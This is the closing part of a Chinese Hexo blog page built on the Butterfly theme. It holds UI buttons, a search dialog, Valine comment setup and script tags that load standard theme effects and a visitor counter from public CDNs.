title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
+      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
